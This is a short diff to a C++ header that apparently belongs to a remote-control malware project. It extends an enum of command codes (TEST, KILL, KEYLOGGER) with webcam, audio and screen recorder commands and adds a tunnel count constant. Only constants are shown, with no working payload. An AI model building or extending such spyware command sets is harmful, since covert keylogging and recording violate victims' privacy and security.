@@ -7,9 +7,12 @@ typedef uint8_t CommandCode;
 typedef uint16_t Status;
 
 enum : CommandCode {
-    TEST      = 0b00000001,
-    KILL      = 0b00000010,
-    KEYLOGGER = 0b00000100,
+    TEST            = 0b00000001,
+    KILL            = 0b00000010,
+    KEYLOGGER       = 0b00000100,
+    WEBCAM_RECORDER = 0b00001000,
+    AUDIO_RECORDER  = 0b00010000,
+    SCREEN_RECORDER = 0b00100000,
 };
 
 enum : Status {
@@ -27,5 +30,7 @@ enum : Status {
 #define TCP_BASED SOCK_STREAM
 #define UDP_BASED SOCK_DGRAM
 #define MAX_COMMAND_LEN 256
+
+#define TUNNEL_NUMS 4
 
 #endif // COMMON_HPP
